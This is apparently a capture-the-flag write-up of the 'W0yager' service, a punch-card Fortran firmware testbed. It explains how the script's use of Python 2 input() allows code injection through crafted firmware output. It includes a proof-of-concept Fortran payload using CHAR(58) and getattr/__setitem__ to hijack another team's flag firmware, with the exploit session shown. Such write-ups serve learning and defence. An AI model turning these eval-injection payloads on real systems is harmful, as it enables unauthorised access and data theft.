# W0yager

## Description

> This is a python interface to the firmware test environment of the w0yager
> space probe.

This service of the team *We_0wn_Y0u* is a very funny one. The w0yager deep
space exploration program has been launched but for the success of it,
programmers are needed:

```
   w0yager Space Exploration Program

                }--O--{
                  [^]
                 /ooo\
 ______________:/o   o\:______________
|^|^|^|^|^|^|^A|":|||:"|A:|^|^|^|^|^|^|
'^ ^ ^ ^ ^ ^ ^ !::{o}::! ^ ^ ^ ^ ^ ^ ^'
                \     /
                 \.../
      ____       "---"       ____
     |\/\/|=======|*|=======|\/\/|
     :----"       /-\       "----:
                 /ooo\
                #|ooo|#
                 \___/

      Where no man has gone before!

> about

    # Welcome to the w0yager Deep Space Exploration Program
    # Our goal is knowledge.
    #
    # Due to recent events we are looking for talented programmers
    # after several decades of uninterrupted operation.
    #
    # This interface is a testbed to show us your skill.
    # Since we need to update our firmware, this testbed
    # allows you to submit modules that can directly interact
    # within our existing SAT-OS.
    #
    # To accommodate our target audience of senior programmers
    # we tried to mimic their usual work flow as close as possible.
    # This interface is specifically crafted to allow you to
    # reuse your existing code and programming techniques.
```

The key word in this description of the space program is `senior programmers`.
In fact, with this service you will be able to `upload` a firmware, `compile`
it and `run` it to see the result. However, it must be done in a senior
programmers kind of way, i.e. you have to upload a punch card which describes
a fortran 90 program.

### Upload a program
This is actually the harder part. First of all, the fortran firmware must
follow a specific format. It will be compiled as a library which must expose
a specific subroutine named `upstart`. This is the entry point of the firmware.
Usually, most firmwares look like that:
```fortran
subroutine upstart();
! Your code
end subroutine upstart
```

For each line of code, you must create a punch card which describes it. It's
actually not a real punch card, but an image of it:

![Punch card][card]

A punch card is nothing more than a succession of columns which code a single
character each. Each column is composed of 12 lines which may have been
punched. Based on the position of the holes in the column, we get a character.
Besides, each card contains exactly 80 columns, which means you can't have more
than 80 characters on each line of code (but who would want more than that?).

The translation between holes and characters is described by the following
table:
```
    //,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"()_=;*' |
12 / O           OOOOOOOOO                        OOOOOO             OOOOOOOO |
11|   O                   OOOOOOOOO                     OOOOOO       OOOOOOOO |
 0|    O                           OOOOOOOOO                  OOOOOOO         |
 1|     O        O        O        O                                          |
 2|      O        O        O        O       O     O     O     O      O        |
 3|       O        O        O        O       O     O     O     O      O       |
 4|        O        O        O        O       O     O     O     O      O      |
 5|         O        O        O        O       O     O     O     O      O     |
 6|          O        O        O        O       O     O     O     O      O    |
 7|           O        O        O        O       O     O     O     O      O   |
 8|            O        O        O        O OOOOOOOOOOOOOOOOOOOOOOOOO      O  |
 9|             O        O        O        O                        O       O |
  |___________________________________________________________________________|
```
`O` marks the holes in lines.

For the image of the punch card to be read correctly, it must contains some
margins:
- A top margin of the height of a line
- A left margin of the width of 2 columns
- A right margin of the width of 2 columns

The punch card thus looks something like that:
```
   __________________________________|   |____________________________________
  /··································|   |····································`
 /·12————————————————————————————————|   |————————————————————————————————12··|
|··11————————————————————————————————|   |————————————————————————————————11··|
|··0—————————————————————————————————|   |—————————————————————————————————0··|
|··1—————————————————————————————————|   |—————————————————————————————————1··|
|··2—————————————————————————————————|   |—————————————————————————————————2··|
|··3—————————————————————————————————| … |—————————————————————————————————3··|
|··4—————————————————————————————————|   |—————————————————————————————————4··|
|··5—————————————————————————————————|   |—————————————————————————————————5··|
|··6—————————————————————————————————|   |—————————————————————————————————6··|
|··7—————————————————————————————————|   |—————————————————————————————————7··|
|··8—————————————————————————————————|   |—————————————————————————————————8··|
|··9—————————————————————————————————|   |—————————————————————————————————9··|
 `-----------------------------------|   |------------------------------------’
```

When your cards are finally ready, you can upload them on the space probe using
the command `upload` which takes the number of punch cards as argument. You
can then send the base64 of each image of punch card, one after an other. The
firmware will be saved and its name printed. You can finallly use this name to
send the `compile` command and the `run` one.

When you run a firmware, the python script will call the binary `fwloader`
which is a basically a wrapper of your firmware. It loads the compiled firmware
library and delegates the execution to `upstart`. The binary will then return
to the python script the string:
```
{ 'data':'EVERY_DATA_PRINTED_BY_THE_LIBRARY'}
```
However, before the library is being called, `fwloader` uses `prctl` to set the
secure computing (seccomp) to `SECCOMP_MODE_STRICT`. In this mode, the library
can only access to system calls `read`, `write`, `_exit` and `sigreturn`. The
capabilities of the firmware are thus quite limited.


### Flag

Flag Description:

> Flags are identified by the file name of the firmware source files.

Each *flag* is stored in a firmware whose name is the *flag_id*. The firmware
of a *flag* contains this code:
```fortran
subroutine upstart();
write(*,'(A)',advance="no") "FLG0123456789abc"
end subroutine upstart
```

If such firmware is run, we get the data `{'data': 'FLG0123456789abc'}`.


## Vulnerabilities

An obvious vulnerability comes from the python script which uses `input()`
builtin instead of `raw_input()`.
```python
exec_env = os.environ.copy()
exec_env["LD_LIBRARY_PATH"] = '{}:'.format( os.path.join( os.getcwd(), self.config['module_store'], self.filemap[fw_name] ) ) +  exec_env.get("LD_LIBRARY_PATH", '')
exec_command = ['../ro/fwloader']
p = Popen(exec_command, env=exec_env, stdin = PIPE, stdout = PIPE, stderr = PIPE)
sys.stdin = p.stdout
try:
    while True:
        sensor_data = input()
        print sensor_data
except EOFError:
    pass
sys.stdin = sys.__stdin__
```

Because, `input()` is equivalent to `eval(raw_input())`, we can abuse the
script to modify some variables in it. One good target is the
dictionary `self.filemap` which contains the list of all firmwares accessible
in the current session.

In addition, this is possible beacause we can control the output of `fwloader`.
In fact, the binary first prints `{ 'data':'`, then runs the firmware which may
append data to it, and finally prints `'}`. Thus, like SQL injection, we can
output `'` in the firmware to close the string started by `{ 'data':'`.


## Proof of Concept

For this proof of concept, we'll try to get the flag identified by
`fw_Ix2RyS.f90`. In addition, we consider that we have an automated way to
create punch card image from a given text, see `create_card` in [poc.py][poc]
for that.

### Create the firmware

The first step is to create the firmware which will print the output to
exploit `input()`. From a python point of view, we want to execute the
command
```python
self.filemap.update({'fw_Ix2RyS.f90': None})
```
The string to print in the fortran firmware could then be
```python
' + str(self.filemap.update({'fw_Ix2RyS.f90': None})) + '
```
However, due to the restricted possible characters, the period isn't allowed,
see [upload a program](#upload-a-program) for a complete list. But this can be
bypassed using `getattr` and `decode('hex')` for the *flag_id*:
```python
' + str(getattr(getattr(self,'filemap'),'update')({getattr('66775f4978325279532e663930','decode')('hex'): None})) + '
```
It's the same problem with `+` which isn't allowed. Instead of concatenating
strings, we can tranform the output of the firmware in a proper dictionary
like:
```python
{ 'data': '', 'k': getattr(…), 'k2':''}
```
However, `:` isn't allowed neither, and with the possible characters
in punch cards, there are no ways to get a proper expression which could be
evaluated. But we'll inject python code inside a fortran program. Maybe fortran
can help us with it.

A quick search on the Internet, tells us about the `CHAR` function in fortran.
Here is our way to get the character `:` in the output (`CHAR(58)`).

The final characters which aren't allowed in punch cards are `{` and `}` used
in the `update` function. This isn't hard to circumvent, instead we can use
`__setitem__` to modify the dictionary.

Thus, the fortran firmware would be:
```fortran
subroutine upstart();
write(*,'(A)') "', 'k'" // CHAR(58) // "getattr(getattr(self,'filemap'),'__setitem__')(getattr('66775f4978325279532e663930','decode')('hex'), None), 'k2'" // CHAR(58) // "'"
end subroutine upstart
```

I think it's obvious that the write line is way longer than the 80 maximum
characters. We thus need to split it across multiple lines and use 
`write(*,'(A)',advance="no")` instead to avoid newlines after each `write`

### Exploit

Now that we have created our exploit firmware, we can upload and run it:
```
> list
              Source               Module
       fw_zKukRi.f90                 None

> compile fw_zKukRi.f90

> run fw_zKukRi.f90
{'k2': '', 'k': None, 'data': ''}

> list
              Source               Module
       fw_zKukRi.f90        module_lBdftU
       fw_Ix2RyS.f90                 None
```

The exploit seems to have worked, we now have the flag firmware registered as
being ours. Lets run it
```
> compile fw_Ix2RyS.f90

> run fw_Ix2RyS.f90
{'data': 'FLGnQmfnQce32Dwt'}

```

The exploit works fine and is automated in [poc.py][poc]. You can even add the
`-s` option as first argument if you want to see all uploaded punch cards.

```bash
$ ./poc.py 192.168.56.101 20138 fw_Ix2RyS.f90
FLGnQmfnQce32Dwt
```


[poc]: poc.py
[card]: assets/punch_card.png
